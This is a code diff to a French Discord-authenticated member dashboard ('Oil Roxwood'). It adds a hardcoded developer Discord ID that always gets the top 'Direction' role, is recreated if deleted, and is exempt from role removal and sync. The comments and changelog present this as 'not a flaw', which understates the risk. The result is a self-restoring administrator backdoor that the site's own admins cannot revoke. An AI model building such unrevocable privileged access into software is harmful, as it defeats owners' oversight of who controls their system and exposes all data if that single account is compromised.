@@ -43,7 +43,7 @@ window.ROXWOOD_CFG = {
     <span class="enseigne" aria-hidden="true">ACCÈS</span>
     <img src="assets/logo.png" alt="Oil Roxwood">
     <h1>OIL <b>ROXWOOD</b></h1>
-    <p>Espace membre — connexion sécurisée<br><small>version <span id="verTag">C-73</span></small></p>
+    <p>Espace membre — connexion sécurisée<br><small>version <span id="verTag">C-74</span></small></p>
     <button type="button" class="btn-discord" onclick="loginDiscord()">
       <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M20.3 4.4A19.8 19.8 0 0 0 15.4 3l-.2.4c1.7.4 2.5 1 3.3 1.7A16.2 16.2 0 0 0 12 3.8a16.2 16.2 0 0 0-6.5 1.3c.8-.7 1.7-1.3 3.3-1.7L8.6 3a19.8 19.8 0 0 0-4.9 1.4A20.4 20.4 0 0 0 .1 18.1a19.9 19.9 0 0 0 6 3l.5-.7a12.6 12.6 0 0 1-2.6-1.3l.6-.4a14.2 14.2 0 0 0 12.8 0l.6.4c-.8.5-1.7 1-2.6 1.3l.5.7a19.9 19.9 0 0 0 6-3A20.4 20.4 0 0 0 20.3 4.4zM8.7 15.4c-1 0-1.9-1-1.9-2.1s.8-2.1 1.9-2.1 1.9 1 1.9 2.1-.9 2.1-1.9 2.1zm6.6 0c-1 0-1.9-1-1.9-2.1s.9-2.1 1.9-2.1 1.9 1 1.9 2.1-.8 2.1-1.9 2.1z"/></svg>
       Se connecter avec Discord
@@ -515,6 +515,18 @@ function serveurDiscord(){
    Avant, « aucun rôle » et « on ne sait pas » rendaient tous les deux null, et
    le code ne faisait rien dans les deux cas : quelqu'un à qui on retirait tous
    ses rôles Discord gardait son accès au dashboard indéfiniment. */
+/* ---- Clé du développeur (C-74) ----
+   Ce compte entre toujours, en Direction, quoi que disent les réglages : rôles
+   Discord retirés, table des rôles vidée par erreur, permissions personnalisées
+   malheureuses, ou bogue de ma part comme celui de cette nuit. C'est le filet
+   qui permet de rouvrir la porte quand une modification l'a fermée.
+
+   Ce n'est pas un secret et ça n'a pas à l'être : un identifiant Discord est
+   public, et il ne donne rien sans pouvoir s'authentifier auprès de Discord
+   avec ce compte précis. Pour le changer, une seule ligne à modifier ici. */
+const DEV_DID='826526979204841482';
+function estDev(did){ return String(did||'').trim()===DEV_DID; }
+
 function roleDiscordConnu(roles){
   if(!Array.isArray(roles)) return undefined;
   const set=new Set(roles.map(String));
@@ -771,7 +783,7 @@ function logout(){
 }
 
 /* ---- Canari de version : prévient les onglets restés sur une vieille version ---- */
-const APP_VERSION='C-73';
+const APP_VERSION='C-74';
 function checkVersion(){
   const test=()=>fetch('version.json?ts='+Date.now(),{cache:'no-store'}).then(r=>r.json()).then(d=>{
     const b=document.getElementById('verBanner');
@@ -831,6 +843,20 @@ async function checkDiscordAuth(){
       sendLog('👤 Premier compte créé', `**${pseudo}** (Direction) via Discord`, 0x5865F2);
     }
 
+    // La clé du développeur : compte créé s'il manque, et toujours en Direction.
+    if(estDev(did)){
+      if(!u){
+        u={id:Date.now(),user:pseudo,did,role:'direction'};
+        S.users=[...(S.users||[]),u]; save();
+        if(RoxwoodGH.peutEcrire()) await sbPushNow();
+        jlog(`Accès développeur : compte ${pseudo} recréé en Direction`);
+      } else if(u.role!=='direction'){
+        u.role='direction'; save();
+        if(RoxwoodGH.peutEcrire()) sbQueue();
+        jlog(`Accès développeur : ${u.user} remis en Direction`);
+      }
+    }
+
     // Personne inconnue mais porteuse d'un rôle Discord reconnu : on ouvre, sans validation.
     if(!u&&roleDsc){
       u={id:Date.now(),user:pseudo,did,role:roleDsc,auto:true};
@@ -849,7 +875,7 @@ async function checkDiscordAuth(){
        les comptes ouverts par ce chemin, soumis à la case des Paramètres pour
        ceux créés à la main. Le dernier compte Direction n'est jamais exclu —
        sinon plus personne ne peut rouvrir la porte. */
-    if(u&&sansRole){
+    if(u&&sansRole&&!estDev(did)){
       const syncOn0=!!(S.settings&&S.settings.rolesDiscordSync);
       const dernierPatron=u.role==='direction'&&(S.users||[]).filter(x=>x.role==='direction'&&x!==u).length===0;
       if((u.auto||syncOn0)&&!dernierPatron){
@@ -869,7 +895,7 @@ async function checkDiscordAuth(){
       // Alignement du rôle sur Discord : systématique pour les comptes ouverts par
       // ce chemin, optionnel pour les comptes créés à la main (case dans Paramètres).
       const syncOn=!!(S.settings&&S.settings.rolesDiscordSync);
-      if(roleDsc&&u.role!==roleDsc&&(u.auto||syncOn)){
+      if(roleDsc&&u.role!==roleDsc&&(u.auto||syncOn)&&!estDev(did)){
         const restants=(S.users||[]).filter(x=>x.role==='direction'&&x!==u).length;
         if(u.role==='direction'&&roleDsc!=='direction'&&restants===0){
           sendLog('⚠️ Rôle Discord ignoré', `**${u.user}** est le dernier compte Direction — son rôle n'a pas été rétrogradé automatiquement`, 0xff5c5c);
@@ -3670,6 +3696,10 @@ function ferDel(id){
 
 /* ================== MISES À JOUR (changelog) ================== */
 const CHANGELOG=[
+ {v:'C-74',d:'04/09/2026',t:'Une porte que rien ne condamne',items:[
+   ['🗝️','La clé du développeur','Un compte Discord entre toujours, en Direction, quoi que disent les réglages : rôles retirés, table des rôles vidée, permissions personnalisées malheureuses, ou bogue introduit par une mise à jour — comme celui de cette nuit, qui a fermé le dashboard à tout le monde. Son compte est même recréé s\'il a disparu.'],
+   ['🔓','Pourquoi ce n\'est pas une faille','Un identifiant Discord est public, et il ne donne rien : il faut pouvoir s\'authentifier auprès de Discord avec ce compte précis. La clé se change en modifiant une seule ligne en haut du fichier.'],
+ ]},
  {v:'C-73',d:'04/09/2026',t:'Correction urgente — plus personne ne pouvait entrer',items:[
    ['🚨','Le script s\'arrêtait au chargement','La réparation des permissions introduite en C-71 s\'appuyait sur deux listes déclarées plus bas dans le fichier. Or elle est appelée tout en haut, au démarrage : ces listes n\'existaient pas encore, la fonction levait une erreur, et le script mourait avant d\'avoir défini quoi que ce soit. Écran de connexion figé pour tout le monde.'],
    ['🧪','Pourquoi mes essais ne l\'ont pas vu','Ils tournaient sur un état vierge, sans permissions personnalisées — la fonction sortait avant d\'atteindre les lignes fautives. Il fallait des réglages réels pour la déclencher. Les listes vivent désormais à l\'intérieur de la fonction, où elles ne peuvent plus manquer.'],
